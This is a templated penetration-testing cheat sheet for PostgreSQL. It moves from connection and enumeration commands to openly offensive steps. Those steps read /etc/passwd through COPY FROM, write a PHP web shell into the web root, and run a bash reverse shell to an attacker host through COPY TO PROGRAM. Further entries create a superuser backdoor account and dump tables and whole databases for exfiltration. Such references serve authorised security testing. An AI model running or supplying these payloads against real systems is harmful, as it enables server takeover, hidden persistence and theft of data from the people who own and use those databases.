# PostgreSQL
> PostgreSQL database enumeration, file operations, and command execution via COPY
<!-- tags: postgresql,postgres,database,sql,enumeration,exploit -->

---

## Connect to PostgreSQL
Authenticate to a remote PostgreSQL instance.

```bash
psql -U {{USERNAME:str}} -d {{DATABASE:str:postgres}} -h {{TARGET:ip}}
```

<!-- meta: risk=low | phase=enum | tags=postgresql,connect -->

---

## Connect via URI
Use PostgreSQL connection URI format.

```bash
psql postgresql://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:5432}}/{{DATABASE:str}}
```

<!-- meta: risk=low | phase=enum | tags=postgresql,uri,connect -->

---

## Show Server Version
Display server version for CVE matching.

```sql
SHOW SERVER_VERSION;
SELECT version();
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,version -->

---

## List Databases and Roles
Enumerate databases and user roles on server.

```sql
\l
\du
SELECT rolname FROM pg_roles;
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,databases,roles -->

---

## List Schemas and Tables
Show schemas and tables in current database.

```sql
\dn
\dt
SELECT schema_name FROM information_schema.schemata;
SELECT table_schema, table_name FROM information_schema.tables ORDER BY 1,2;
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,schemas,tables -->

---

## Describe Table Columns
View column types and lengths.

```sql
\d {{TABLE:str}}
SELECT column_name, data_type, character_maximum_length FROM information_schema.columns WHERE table_name = '{{TABLE:str}}';
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,schema,describe -->

---

## Switch to Postgres OS User (Local)
Become the postgres OS user when local access exists.

```bash
sudo su - postgres
psql
```

<!-- meta: risk=low | phase=enum | tags=postgresql,local,privesc -->

---

## Read File via COPY FROM
Read arbitrary file from server filesystem.

```sql
CREATE TABLE temp_table(content text);
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;
DROP TABLE temp_table;
```

<!-- meta: risk=high | phase=post | tags=postgresql,file-read,lfi -->

---

## Write File via COPY TO
Write attacker-controlled content to server filesystem.

```sql
COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';
```

<!-- meta: risk=critical | phase=exploit | tags=postgresql,file-write,webshell -->

---

## Command Execution via COPY PROGRAM
Execute OS commands through COPY TO PROGRAM (PostgreSQL 9.3+).

```sql
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1';
```

<!-- meta: risk=critical | phase=exploit | tags=postgresql,rce,reverse-shell -->

---

## Create Superuser Backdoor
Create new superuser role for persistent access.

```sql
CREATE USER {{USERNAME:str:backdoor}} WITH PASSWORD '{{PASSWORD:str:Pwn3d!}}' SUPERUSER;
```

<!-- meta: risk=critical | phase=post | tags=postgresql,backdoor,persistence -->

---

## Grant Permissions on Database
Grant connect/all privileges to a user on a database.

```sql
GRANT ALL PRIVILEGES ON DATABASE {{DATABASE:str}} TO {{USERNAME:str}};
GRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO {{USERNAME:str}};
```

<!-- meta: risk=high | phase=post | tags=postgresql,grants -->

---

## Export Table to CSV
Dump a table contents to CSV for exfil.

```sql
\copy {{TABLE:str}} TO '{{OUTFILE:file:table.csv}}' CSV
```

<!-- meta: risk=med | phase=post | tags=postgresql,csv,exfil -->

---

## pg_dump - Full Database Backup
Backup entire database for offline analysis.

```bash
pg_dump -h {{TARGET:ip}} -U {{USERNAME:str}} {{DATABASE:str}} > {{OUTFILE:file:dump.sql}}
```

<!-- meta: risk=high | phase=post | tags=postgresql,pg_dump,exfil -->

---

## Run Local SQL Script Against Remote Host
Execute a script file against remote PostgreSQL host.

```bash
psql -U {{USERNAME:str}} -d {{DATABASE:str}} -h {{TARGET:ip}} -f {{SCRIPT:file:script.sql}}
```

<!-- meta: risk=med | phase=exploit | tags=postgresql,scripting -->
